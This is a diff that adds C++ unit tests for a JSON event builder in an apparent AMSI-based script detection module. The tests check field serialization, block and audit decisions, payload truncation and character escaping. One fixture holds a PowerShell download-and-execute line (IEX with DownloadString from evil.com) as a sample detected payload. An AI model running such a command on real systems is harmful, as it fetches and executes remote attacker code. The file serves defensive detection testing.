@@ -300,5 +300,152 @@ int main()
             return 1;
     }
 
+    // Batch 4a: 完整事件 JSON golden fixture - 成功采集场景
+    {
+        EventJsonBuilder builder;
+        EventJsonBuildInput input;
+        input.eventId = "evt-001";
+        input.timestamp = "2026-05-09T12:00:00.000Z";
+        input.moduleName = "rasp_mod_amsi";
+        input.ruleId = "rule-malicious-script";
+        input.sensor = "AmsiProvider";
+        input.block = true;
+        input.severity = "Critical";
+        input.description = "检测到恶意脚本执行";
+        input.appName = "powershell.exe";
+        input.contentName = "C:\\Users\\test\\malicious.ps1";
+        input.confidence = 95;
+        input.ip = "192.168.1.100";
+        input.ua = "WindowsTerminal/1.0";
+        input.payload = "IEX (New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')";
+        input.parentPid = 5678;
+        input.parentProcessName = "cmd.exe";
+
+        EventJsonBuildResult result = builder.BuildDetection(input);
+
+        std::map<std::string, std::string> fields;
+        if (!Expect(ParseFlatJsonObject(result.compactJson, fields), "完整事件 JSON 解析成功"))
+            return 1;
+
+        // 验证核心字段
+        if (!Expect(fields["id"] == "evt-001", "eventId 正确")) return 1;
+        if (!Expect(fields["ts"] == "2026-05-09T12:00:00.000Z", "timestamp 正确")) return 1;
+        if (!Expect(fields["sev"] == "Critical", "severity 正确")) return 1;
+        if (!Expect(fields["act"] == "block", "action=block 正确")) return 1;
+        if (!Expect(fields["cat"] == "Detection", "category=Detection 正确")) return 1;
+        if (!Expect(fields["mod"] == "rasp_mod_amsi", "moduleName 正确")) return 1;
+        if (!Expect(fields["sensor"] == "AmsiProvider", "sensor 正确")) return 1;
+        if (!Expect(fields["rule"] == "rule-malicious-script", "ruleId 正确")) return 1;
+        if (!Expect(fields["desc"] == "检测到恶意脚本执行", "description 正确")) return 1;
+        if (!Expect(fields["appName"] == "powershell.exe", "appName 正确")) return 1;
+        if (!Expect(fields["contentName"] == "C:\\Users\\test\\malicious.ps1", "contentName 正确")) return 1;
+        if (!Expect(fields["confidence"] == "95", "confidence 正确")) return 1;
+        if (!Expect(fields["ip"] == "192.168.1.100", "ip 正确")) return 1;
+        if (!Expect(fields["ua"] == "WindowsTerminal/1.0", "ua 正确")) return 1;
+
+        // 验证 payload 和 parent 字段
+        if (!Expect(fields["pattern"] == input.payload, "payload/pattern 正确")) return 1;
+        if (!Expect(fields["parentPid"] == "5678", "parentPid 正确")) return 1;
+        if (!Expect(fields["parentProcessName"] == "cmd.exe", "parentProcessName 正确")) return 1;
+
+        // 验证决策字段
+        if (!Expect(result.decision == "block", "decision=block 正确")) return 1;
+        if (!Expect(!result.eventTruncated, "payload 未截断")) return 1;
+    }
+
+    // Batch 4a: 完整事件 JSON golden fixture - audit 模式 + 空 parent
+    {
+        EventJsonBuilder builder;
+        EventJsonBuildInput input;
+        input.eventId = "evt-002";
+        input.timestamp = "2026-05-09T12:01:00.000Z";
+        input.moduleName = "rasp_mod_amsi";
+        input.ruleId = "rule-audit-only";
+        input.sensor = "AmsiProvider";
+        input.block = false;  // audit 模式
+        input.severity = "Medium";
+        input.description = "可疑脚本行为（仅审计）";
+        input.appName = "powershell.exe";
+        input.contentName = "C:\\Users\\test\\suspicious.ps1";
+        input.confidence = 50;
+        input.ip = "";
+        input.ua = "";
+        input.payload = "Get-Process | Where-Object {$_.CPU -gt 100}";
+        input.parentPid = 0;  // 空 parent
+        input.parentProcessName = "";
+
+        EventJsonBuildResult result = builder.BuildDetection(input);
+
+        std::map<std::string, std::string> fields;
+        if (!Expect(ParseFlatJsonObject(result.compactJson, fields), "audit + 空 parent JSON 解析成功"))
+            return 1;
+
+        // 验证 audit 决策
+        if (!Expect(fields["act"] == "audit", "action=audit 正确")) return 1;
+        if (!Expect(result.decision == "audit", "decision=audit 正确")) return 1;
+
+        // 验证空 parent 字段
+        if (!Expect(fields["parentPid"] == "0", "空 parentPid=0 正确")) return 1;
+        if (!Expect(fields["parentProcessName"] == "", "空 parentProcessName 正确")) return 1;
+
+        // 验证空 ip/ua 字段
+        if (!Expect(fields["ip"] == "", "空 ip 正确")) return 1;
+        if (!Expect(fields["ua"] == "", "空 ua 正确")) return 1;
+    }
+
+    // Batch 4c: parent 字段 + payload 截断组合
+    {
+        EventJsonBuilder builder;
+        EventJsonBuildInput input = BaseInput();
+        input.payload.assign(10 * 1024, 'X');  // 超过 8KB 截断阈值
+        input.parentPid = 12345;
+        input.parentProcessName = "truncated_parent.exe";
+
+        EventJsonBuildResult result = builder.BuildDetection(input);
+
+        std::map<std::string, std::string> fields;
+        if (!Expect(ParseFlatJsonObject(result.compactJson, fields), "截断 + parent JSON 解析成功"))
+            return 1;
+
+        // 验证 payload 截断
+        if (!Expect(result.eventTruncated, "payload 标记为截断")) return 1;
+        if (!Expect(fields["pattern"].size() == 8 * 1024, "payload 截断到 8KB")) return 1;
+
+        // 验证 parent 字段仍然完整输出（不受截断影响）
+        if (!Expect(fields["parentPid"] == "12345", "截断后 parentPid 正确")) return 1;
+        if (!Expect(fields["parentProcessName"] == "truncated_parent.exe", "截断后 parentProcessName 正确")) return 1;
+    }
+
+    // Batch 4c: parent 字段 + payload 特殊字符组合
+    {
+        EventJsonBuilder builder;
+        EventJsonBuildInput input;
+        input.eventId = "evt-special";
+        input.timestamp = "2026-05-09T12:02:00.000Z";
+        input.moduleName = "rasp_mod_amsi";
+        input.ruleId = "rule-special-chars";
+        input.sensor = "AmsiProvider";
+        input.block = true;
+        input.severity = "High";
+        input.description = "quote \" slash \\ newline\n";
+        input.appName = "powershell.exe";
+        input.contentName = "C:\\path\\with\\spaces\\\"test\".ps1";
+        input.confidence = 70;
+        input.payload = "IEX \"nested \\\"quotes\\\" and \\backslash\"";
+        input.parentPid = 999;
+        input.parentProcessName = "parent with \"quotes\" & \\backslash\\";
+
+        EventJsonBuildResult result = builder.BuildDetection(input);
+
+        std::map<std::string, std::string> fields;
+        if (!Expect(ParseFlatJsonObject(result.compactJson, fields), "特殊字符组合 JSON 解析成功"))
+            return 1;
+
+        // 验证特殊字符在 JSON 往返后保持原样
+        if (!Expect(fields["desc"] == "quote \" slash \\ newline\n", "description 特殊字符往返正确")) return 1;
+        if (!Expect(fields["pattern"] == "IEX \"nested \\\"quotes\\\" and \\backslash\"", "payload 特殊字符往返正确")) return 1;
+        if (!Expect(fields["parentProcessName"] == "parent with \"quotes\" & \\backslash\\", "parentProcessName 特殊字符往返正确")) return 1;
+    }
+
     return 0;
 }
